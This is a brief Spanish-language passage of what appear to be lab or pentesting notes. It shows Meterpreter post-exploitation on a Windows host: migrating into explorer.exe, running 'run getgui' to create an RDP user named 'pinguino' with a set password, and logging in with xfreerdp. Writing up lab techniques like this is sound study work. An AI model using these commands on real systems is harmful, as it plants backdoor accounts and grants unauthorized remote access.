Una vez dentro, tenemos que ser el usuario administrador y mirarnos al proceso de explorer.exe:
![[Pasted image 20230801124356.png]]
![[Pasted image 20230801124529.png]]
Una vez migrado, tenemos que crear un usuario para el protocolo RDP y activarlo:
```bash
run getgui -e -u pinguino -p hack_123
```
![[Pasted image 20230801124656.png]]
Una vez hecho esto, ya podremos entrar dentro del protocolo RDP usando estas credenciales con la herramienta xfreerdp:
```bash
xfreerdp /u:pinguino /p:hack_123 /v:10.2.27.219
```
![[Pasted image 20230801124859.png]]
